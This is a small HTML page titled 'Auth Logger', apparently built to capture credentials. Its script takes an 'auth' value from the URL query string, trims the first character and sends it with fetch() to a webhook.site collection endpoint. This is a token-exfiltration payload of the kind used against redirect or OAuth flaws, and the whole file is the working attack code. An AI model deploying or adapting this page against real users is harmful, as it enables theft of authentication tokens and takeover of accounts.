<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auth Logger</title>
</head>
<body>
    <pre id="log"></pre>
    <script>
        const log = (m) => document.getElementById('log').textContent += m + "\n";
        const params = new URLSearchParams(window.location.search);
        const auth = params.get("auth");
        if (auth) {
            log("auth parameter detected: " + auth);
            // Remove the first character of the auth param
            const modifiedAuth = auth.slice(1);
            // Construct the URL with /c=modifiedAuth
            const url = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${modifiedAuth}`;
            // Send a GET request to the URL
            fetch(url)
                .then(response => {
                    if (response.ok) {
                        log("Request sent successfully to: " + url);
                    } else {
                        log("Failed to send request: " + response.status);
                    }
                })
                .catch(error => {
                    log("Error sending request: " + error);
                });
        } else {
            log("No auth parameter present.");
        }
    </script>
</body>
</html>
